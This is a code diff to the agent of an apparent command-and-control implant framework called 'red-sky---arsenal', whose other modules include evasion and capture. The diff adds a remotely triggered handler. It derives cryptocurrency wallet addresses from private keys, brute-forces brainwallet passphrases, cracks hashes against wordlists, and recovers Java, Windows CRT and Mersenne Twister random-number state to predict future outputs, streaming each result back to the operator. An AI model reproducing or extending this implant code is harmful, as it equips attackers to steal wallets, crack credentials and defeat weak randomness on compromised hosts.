@@ -28,6 +28,7 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/capturer"
 	"github.com/sk666G/red-sky---arsenal/internal/cloudgo"
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
+	"github.com/sk666G/red-sky---arsenal/internal/cryptogo"
 	"github.com/sk666G/red-sky---arsenal/internal/cryptor"
 	"github.com/sk666G/red-sky---arsenal/internal/evade"
 	"github.com/sk666G/red-sky---arsenal/internal/icsgo"
@@ -251,6 +252,13 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runCloud(conn, sess, cc)
+		case proto.TypeCryptoOpStart:
+			var co proto.CryptoOpStart
+			if err := json.Unmarshal(env.Payload, &co); err != nil {
+				log.Printf("[cryptoop] unmarshal: %v", err)
+				continue
+			}
+			go runCryptoOp(conn, sess, co)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -1087,6 +1095,121 @@ func runCloud(conn net.Conn, sess *crypto.Session, c proto.CloudStart) {
 
 	default:
 		send("error", "unknown cloud action: "+c.Action, "", false, true)
+		return
+	}
+	send("done", "", "", true, true)
+}
+
+// runCryptoOp drives one cryptogo operation on the agent. Streams results
+// as CryptoOpData messages. Called via proto.TypeCryptoOpStart.
+func runCryptoOp(conn net.Conn, sess *crypto.Session, c proto.CryptoOpStart) {
+	send := func(stage, msg, detail string, ok, done bool) {
+		sendTunnelAck(conn, sess, proto.TypeCryptoOpData, proto.CryptoOpData{
+			SessionID: c.SessionID,
+			Stage:     stage,
+			Message:   msg,
+			Detail:    detail,
+			OK:        ok,
+			Done:      done,
+		})
+	}
+
+	switch c.Op {
+	case "derive":
+		priv := new(big.Int)
+		if _, ok := priv.SetString(c.PrivHex, 16); !ok {
+			send("error", "bad priv_hex", "", false, true)
+			return
+		}
+		p, w, e, err := cryptogo.Addresses(priv)
+		if err != nil {
+			send("error", "derive", err.Error(), false, true)
+			return
+		}
+		send("result", "btc-p2pkh", p, true, false)
+		send("result", "btc-p2wpkh", w, true, false)
+		send("result", "eth", e, true, false)
+
+	case "brainwallet":
+		priv := cryptogo.BrainwalletPriv(c.Passphrase)
+		p, w, e, err := cryptogo.Addresses(priv)
+		if err != nil {
+			send("error", "brainwallet", err.Error(), false, true)
+			return
+		}
+		send("result", "priv_hex", cryptogo.PrivHex(priv), true, false)
+		send("result", "btc-p2pkh", p, true, false)
+		send("result", "btc-p2wpkh", w, true, false)
+		send("result", "eth", e, true, false)
+
+	case "hash_id":
+		matches := cryptogo.IdentifyHash(c.TargetHash)
+		if len(matches) == 0 {
+			send("result", "no signature match", "", false, false)
+		} else {
+			send("result", "matches", fmt.Sprintf("%v", matches), true, false)
+		}
+
+	case "hash_crack":
+		onProg := func(n int64) {
+			send("progress", fmt.Sprintf("%d tried", n), "", true, false)
+		}
+		res, err := cryptogo.CrackHash(c.Algo, c.TargetHash, c.Wordlist, onProg)
+		if err != nil {
+			send("error", "crack", err.Error(), false, true)
+			return
+		}
+		if res.Found {
+			send("result", "FOUND", fmt.Sprintf("word=%s tried=%d", res.Word, res.Tried), true, false)
+		} else {
+			send("result", "not found", fmt.Sprintf("tried=%d", res.Tried), false, false)
+		}
+
+	case "java_recover":
+		st, err := cryptogo.JavaRecoverFromTwoInts(c.JavaA, c.JavaB)
+		if err != nil {
+			send("error", "java recover", err.Error(), false, true)
+			return
+		}
+		send("result", "state", fmt.Sprintf("0x%x", st), true, false)
+		n := c.JavaN
+		if n <= 0 {
+			n = 10
+		}
+		pred := cryptogo.JavaPredict(st, n)
+		send("result", "next ints", fmt.Sprintf("%v", pred), true, false)
+
+	case "win_brute":
+		lo := c.WinLo
+		hi := c.WinHi
+		if hi == 0 {
+			hi = 1 << 24
+		}
+		cands := cryptogo.WinCRTSeedCandidates(c.WinFirst, lo, hi)
+		send("result", "candidates", fmt.Sprintf("%v", cands), len(cands) > 0, false)
+
+	case "mt_recover":
+		if len(c.MTObs) < 624 {
+			send("error", "mt recover", fmt.Sprintf("need 624 observations, got %d", len(c.MTObs)), false, true)
+			return
+		}
+		st, err := cryptogo.MTUntemperAll(c.MTObs)
+		if err != nil {
+			send("error", "mt recover", err.Error(), false, true)
+			return
+		}
+		n := c.MTN
+		if n <= 0 {
+			n = 10
+		}
+		pred := make([]uint32, 0, n)
+		for i := 0; i < n; i++ {
+			pred = append(pred, st.Next())
+		}
+		send("result", "next outputs", fmt.Sprintf("%v", pred), true, false)
+
+	default:
+		send("error", "unknown op: "+c.Op, "", false, true)
 		return
 	}
 	send("done", "", "", true, true)
